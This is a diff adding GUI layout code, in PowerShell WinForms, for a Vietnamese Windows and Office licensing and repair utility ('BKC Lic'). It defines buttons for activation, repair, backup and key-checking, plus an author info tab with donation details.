+$btnInstallOfficeCID.BackColor = [System.Drawing.Color]::FromArgb(55, 71, 79); $btnInstallOfficeCID.ForeColor = [System.Drawing.Color]::White; $btnInstallOfficeCID.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnInstallOfficeCID.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnInstallOfficeCID.Add_Click({ Toggle-Buttons $false; Install-OfficeCID; Toggle-Buttons $true }); $tab2.Controls.Add($btnInstallOfficeCID); $allButtons += $btnInstallOfficeCID
+
+
+
+# TAB 3: Sửa lỗi & Bảo mật
+$tab3 = New-Object System.Windows.Forms.TabPage
+$tab3.Text = "3. Sửa Lỗi & Bảo Mật"
+$tab3.BackColor = [System.Drawing.Color]::White
+
+$btnDeepScan = New-Object System.Windows.Forms.Button
+$btnDeepScan.Text = "Quét Bảo Mật Sâu (Tìm Crack)"
+$btnDeepScan.Location = New-Object System.Drawing.Point(15, 30)
+$btnDeepScan.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnDeepScan.BackColor = [System.Drawing.Color]::FromArgb(106, 27, 154); $btnDeepScan.ForeColor = [System.Drawing.Color]::White; $btnDeepScan.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnDeepScan.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnDeepScan.Add_Click({ Toggle-Buttons $false; Invoke-DeepScan; Toggle-Buttons $true }); $tab3.Controls.Add($btnDeepScan); $allButtons += $btnDeepScan
+
+$btnResetWU = New-Object System.Windows.Forms.Button
+$btnResetWU.Text = "Sửa Lỗi Windows Update"
+$btnResetWU.Location = New-Object System.Drawing.Point($col2, 30)
+$btnResetWU.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnResetWU.BackColor = [System.Drawing.Color]::FromArgb(0, 137, 123); $btnResetWU.ForeColor = [System.Drawing.Color]::White; $btnResetWU.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnResetWU.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnResetWU.Add_Click({ Toggle-Buttons $false; Invoke-ResetWU; Toggle-Buttons $true }); $tab3.Controls.Add($btnResetWU); $allButtons += $btnResetWU
+
+$btnFixHosts = New-Object System.Windows.Forms.Button
+$btnFixHosts.Text = "Kiểm Tra & Sửa File Hosts"
+$btnFixHosts.Location = New-Object System.Drawing.Point(15, 90)
+$btnFixHosts.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnFixHosts.BackColor = [System.Drawing.Color]::FromArgb(230, 81, 0); $btnFixHosts.ForeColor = [System.Drawing.Color]::White; $btnFixHosts.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnFixHosts.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnFixHosts.Add_Click({ Toggle-Buttons $false; Invoke-FixHosts; Toggle-Buttons $true }); $tab3.Controls.Add($btnFixHosts); $allButtons += $btnFixHosts
+
+$btnSystemRepair = New-Object System.Windows.Forms.Button
+$btnSystemRepair.Text = "Phục Hồi Hệ Thống (SFC/DISM)"
+$btnSystemRepair.Location = New-Object System.Drawing.Point($col2, 90)
+$btnSystemRepair.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnSystemRepair.BackColor = [System.Drawing.Color]::FromArgb(25, 118, 210); $btnSystemRepair.ForeColor = [System.Drawing.Color]::White; $btnSystemRepair.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnSystemRepair.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnSystemRepair.Add_Click({ Toggle-Buttons $false; Invoke-SystemRepair; Toggle-Buttons $true }); $tab3.Controls.Add($btnSystemRepair); $allButtons += $btnSystemRepair
+
+$btnRestartServices = New-Object System.Windows.Forms.Button
+$btnRestartServices.Text = "Khởi Động Lại SPP / OSPP"
+$btnRestartServices.Location = New-Object System.Drawing.Point(15, 150)
+$btnRestartServices.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnRestartServices.BackColor = [System.Drawing.Color]::FromArgb(194, 24, 91); $btnRestartServices.ForeColor = [System.Drawing.Color]::White; $btnRestartServices.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnRestartServices.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnRestartServices.Add_Click({ Toggle-Buttons $false; Restart-LicensingServices; Toggle-Buttons $true }); $tab3.Controls.Add($btnRestartServices); $allButtons += $btnRestartServices
+
+$btnRegisterLicDLLs = New-Object System.Windows.Forms.Button
+$btnRegisterLicDLLs.Text = "Đăng Ký Lại Licensing DLLs"
+$btnRegisterLicDLLs.Location = New-Object System.Drawing.Point($col2, 150)
+$btnRegisterLicDLLs.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnRegisterLicDLLs.BackColor = [System.Drawing.Color]::FromArgb(69, 39, 160); $btnRegisterLicDLLs.ForeColor = [System.Drawing.Color]::White; $btnRegisterLicDLLs.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnRegisterLicDLLs.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnRegisterLicDLLs.Add_Click({ Toggle-Buttons $false; Invoke-RegisterLicDLLs; Toggle-Buttons $true }); $tab3.Controls.Add($btnRegisterLicDLLs); $allButtons += $btnRegisterLicDLLs
+
+$btnForceRemoveOffice = New-Object System.Windows.Forms.Button
+$btnForceRemoveOffice.Text = "Xóa Tận Gốc Office (Force Remove)"
+$btnForceRemoveOffice.Location = New-Object System.Drawing.Point(15, 210)
+$btnForceRemoveOffice.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnForceRemoveOffice.BackColor = [System.Drawing.Color]::FromArgb(211, 47, 47); $btnForceRemoveOffice.ForeColor = [System.Drawing.Color]::White; $btnForceRemoveOffice.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnForceRemoveOffice.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnForceRemoveOffice.Add_Click({ Toggle-Buttons $false; Invoke-ForceRemoveOffice; Toggle-Buttons $true }); $tab3.Controls.Add($btnForceRemoveOffice); $allButtons += $btnForceRemoveOffice
+
+$btnResetNetwork = New-Object System.Windows.Forms.Button
+$btnResetNetwork.Text = "Reset Network && Firewall"
+$btnResetNetwork.Location = New-Object System.Drawing.Point($col2, 210)
+$btnResetNetwork.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnResetNetwork.BackColor = [System.Drawing.Color]::FromArgb(55, 71, 79); $btnResetNetwork.ForeColor = [System.Drawing.Color]::White; $btnResetNetwork.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnResetNetwork.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnResetNetwork.Add_Click({ Toggle-Buttons $false; Invoke-ResetNetwork; Toggle-Buttons $true }); $tab3.Controls.Add($btnResetNetwork); $allButtons += $btnResetNetwork
+
+$btnUninstallOffice = New-Object System.Windows.Forms.Button
+$btnUninstallOffice.Text = "Gỡ Phần Mềm Office"
+$btnUninstallOffice.Location = New-Object System.Drawing.Point(15, 270)
+$btnUninstallOffice.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnUninstallOffice.BackColor = [System.Drawing.Color]::FromArgb(211, 47, 47); $btnUninstallOffice.ForeColor = [System.Drawing.Color]::White; $btnUninstallOffice.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnUninstallOffice.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnUninstallOffice.Add_Click({ Toggle-Buttons $false; Show-OfficeUninstaller; Toggle-Buttons $true }); $tab3.Controls.Add($btnUninstallOffice); $allButtons += $btnUninstallOffice
+# TAB 4: Công cụ Bổ sung (Backup & PID)
+$tab4 = New-Object System.Windows.Forms.TabPage
+$tab4.Text = "4. Backup"
+$tab4.BackColor = [System.Drawing.Color]::White
+
+$lblPIDKey = New-Object System.Windows.Forms.Label
+$lblPIDKey.Text = "Nhập Key cần kiểm tra (PID Checker):"
+$lblPIDKey.Location = New-Object System.Drawing.Point(15, 20)
+$lblPIDKey.AutoSize = $true
+$tab4.Controls.Add($lblPIDKey)
+
+$txtPIDKey = New-Object System.Windows.Forms.TextBox
+$txtPIDKey.Location = New-Object System.Drawing.Point(15, 45)
+$txtPIDKey.Size = New-Object System.Drawing.Size(390, 28)
+$txtPIDKey.Font = $fontCode
+$txtPIDKey.CharacterCasing = 'Upper'
+$tab4.Controls.Add($txtPIDKey)
+
+$btnCheckPID = New-Object System.Windows.Forms.Button
+$btnCheckPID.Text = "Kiểm Tra Key (PID Checker)"
+$btnCheckPID.Location = New-Object System.Drawing.Point($col2, 43)
+$btnCheckPID.Size = New-Object System.Drawing.Size($btnWidth, 32)
+$btnCheckPID.BackColor = [System.Drawing.Color]::FromArgb(25, 118, 210); $btnCheckPID.ForeColor = [System.Drawing.Color]::White; $btnCheckPID.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnCheckPID.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnCheckPID.Add_Click({ Toggle-Buttons $false; Invoke-PIDChecker; Toggle-Buttons $true }); $tab4.Controls.Add($btnCheckPID); $allButtons += $btnCheckPID
+
+$chkBackupTokens = New-Object System.Windows.Forms.CheckBox
+$chkBackupTokens.Text = "Bản quyền (Tokens)"
+$chkBackupTokens.Checked = $true
+$chkBackupTokens.Location = New-Object System.Drawing.Point(15, 90)
+$chkBackupTokens.AutoSize = $true
+$tab4.Controls.Add($chkBackupTokens)
+$chkBackupDrivers = New-Object System.Windows.Forms.CheckBox
+$chkBackupDrivers.Text = "Trình điều khiển (Drivers)"
+$chkBackupDrivers.Checked = $true
+$chkBackupDrivers.Location = New-Object System.Drawing.Point(200, 90)
+$chkBackupDrivers.AutoSize = $true
+$tab4.Controls.Add($chkBackupDrivers)
+$btnBackupTokens = New-Object System.Windows.Forms.Button
+$btnBackupTokens.Text = "Sao Lưu Đã Chọn"
+$btnBackupTokens.Location = New-Object System.Drawing.Point(15, 120)
+$btnBackupTokens.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnBackupTokens.BackColor = [System.Drawing.Color]::FromArgb(46, 125, 50); $btnBackupTokens.ForeColor = [System.Drawing.Color]::White; $btnBackupTokens.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnBackupTokens.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnBackupTokens.Add_Click({ Toggle-Buttons $false; Invoke-BackupTokens; Toggle-Buttons $true }); $tab4.Controls.Add($btnBackupTokens); $allButtons += $btnBackupTokens
+$btnRestoreTokens = New-Object System.Windows.Forms.Button
+$btnRestoreTokens.Text = "Phục Hồi Đã Chọn"
+$btnRestoreTokens.Location = New-Object System.Drawing.Point($col2, 120)
+$btnRestoreTokens.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnRestoreTokens.BackColor = [System.Drawing.Color]::FromArgb(198, 40, 40); $btnRestoreTokens.ForeColor = [System.Drawing.Color]::White; $btnRestoreTokens.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnRestoreTokens.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnRestoreTokens.Add_Click({ Toggle-Buttons $false; Invoke-RestoreTokens; Toggle-Buttons $true }); 
+# TAB 5: Thông Tin Tác Giả
+$tab5 = New-Object System.Windows.Forms.TabPage
+$tab5.Text = "5. Thông Tin"
+$tab5.BackColor = [System.Drawing.Color]::White
+
+$lblInfo = New-Object System.Windows.Forms.Label
+$lblInfo.Text = "CÔNG CỤ TỐI ƯU VÀ KÍCH HOẠT BẢN QUYỀN - BKC LIC ULTIMATE EDITION`n`n" +
+                "Phát triển bởi: Trần Hà (BKC)`n" +
+                "Phiên bản: 3.0 Ultimate`n`n" +
+                "Thông tin liên hệ:`n" +
+                " - Website: lic.bachkhoapc.vn`n" +
+                " - Email: bachkhoapc.vn@gmail.com`n" +
+                " - Facebook: facebook.com/bachkhoapc.vn`n" +
+                " - Hotline / Zalo: 0968.99.33.55`n`n" +
+                "Mọi thắc mắc hoặc cần hỗ trợ, vui lòng liên hệ theo các kênh trên."
+$lblInfo.Font = $fontNormal
+$lblInfo.Location = New-Object System.Drawing.Point(30, 30)
+$lblInfo.Size = New-Object System.Drawing.Size(400, 250)
+$lblInfo.BackColor = [System.Drawing.Color]::White
+$tab5.Controls.Add($lblInfo)
+
+$lblDonate = New-Object System.Windows.Forms.Label
+$lblDonate.Text = "ỦNG HỘ TÁC GIẢ (DONATE)`n" +
+                  "Ngân hàng: Vietcombank (VCB)`n" +
+                  "Số tài khoản: 9969699833`n" +
+                  "Chủ tài khoản: TRAN THANH HA"
+$lblDonate.Font = New-Object System.Drawing.Font("Consolas", 10, [System.Drawing.FontStyle]::Bold)
+$lblDonate.ForeColor = [System.Drawing.Color]::FromArgb(46, 125, 50)
+$lblDonate.Location = New-Object System.Drawing.Point(430, 20)
+$lblDonate.Size = New-Object System.Drawing.Size(320, 75)
+$tab5.Controls.Add($lblDonate)
+
+$pbQR = New-Object System.Windows.Forms.PictureBox
+$pbQR.Location = New-Object System.Drawing.Point(430, 95)
+$pbQR.Size = New-Object System.Drawing.Size(165, 165)
+$pbQR.SizeMode = 'Zoom'
+$pbQR.BorderStyle = 'None'
+$tab5.Controls.Add($pbQR)
+
+$tab5.Add_Enter({
+    if ($pbQR.Image -eq $null) {
+        try {
+            $webClient = New-Object System.Net.WebClient
+            $imgBytes = $webClient.DownloadData("https://img.vietqr.io/image/vcb-9969699833-qr_only.png")
+            $ms = New-Object System.IO.MemoryStream($imgBytes, 0, $imgBytes.Length)
+            $pbQR.Image = [System.Drawing.Image]::FromStream($ms)
+        } catch { }
+    }
+})
+
+# Gộp các Tab vào TabControl
+$tabControl.Controls.Add($tab1)
+$tabControl.Controls.Add($tab2)
+$tabControl.Controls.Add($tab3)
+$tabControl.Controls.Add($tab4)
+$tabControl.Controls.Add($tab5)
+$form.Controls.Add($tabControl)
+
+# Chân trang / Footer
+$lblFooter = New-Object System.Windows.Forms.Label
+$lblFooter.Text = "BKC Lic - By TranHa v3.0 Ultimate • Phát triển tối ưu hóa bản quyền Windows & Microsoft Office"
+$lblFooter.Font = $fontSmall
+$lblFooter.ForeColor = [System.Drawing.Color]::FromArgb(120, 120, 120)
+$lblFooter.Location = New-Object System.Drawing.Point(20, 715)
+$lblFooter.Size = New-Object System.Drawing.Size(845, 20)
+$lblFooter.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
+$form.Controls.Add($lblFooter)
+
+# Tự động quét trạng thái ban đầu khi vừa mở ứng dụng
+$form.Add_Shown({
+    Write-Log "Chào mừng bạn đến với BKC Lic - By TranHa Ultimate Edition!" "CLEAN"
+    Write-Log "Giao diện đã được chia thành các Tab, hãy chọn Tab phù hợp phía dưới." "INFO"
+})
+
+$form.ResumeLayout($false)
+$form.PerformLayout()
+$form.ShowDialog() | Out-Null
+
+
+
